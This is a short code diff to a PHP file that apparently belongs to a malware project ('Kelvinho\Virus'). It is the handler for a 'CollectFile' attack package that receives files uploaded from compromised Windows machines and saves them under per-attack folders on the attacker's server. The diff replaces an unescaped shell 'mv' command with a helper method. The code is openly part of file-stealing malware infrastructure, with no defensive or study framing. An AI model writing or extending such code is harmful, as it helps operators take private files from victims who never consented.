@@ -1,8 +1,11 @@
 <?php
 
-use Kelvinho\Virus\Logs;
+use Kelvinho\Virus\Singleton\Logs;
+use Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectFile;
 
-for ($i = 0; $i < count($this->fileNames); $i++) if (!isset($_FILES["file$i"])) Logs::error("Supposed to have file $i");
-for ($i = 0; $i < count($this->fileNames); $i++) exec("mv \"" . $_FILES["file$i"]["tmp_name"] . "\" \"" . DATA_FILE . "/attacks/<?php echo $this->attack_id; ?>/file$i\"");
+/** @var CollectFile $this */
+
+for ($i = 0; $i < count($this->fileNames); $i++) if (!$this->requestData->hasFile("file$i")) Logs::error("Supposed to have file $i");
+for ($i = 0; $i < count($this->fileNames); $i++) $this->requestData->moveFile("file$i", DATA_FILE . "/attacks/$this->attack_id/file$i");
 $this->setExecuted();
 $this->saveState();
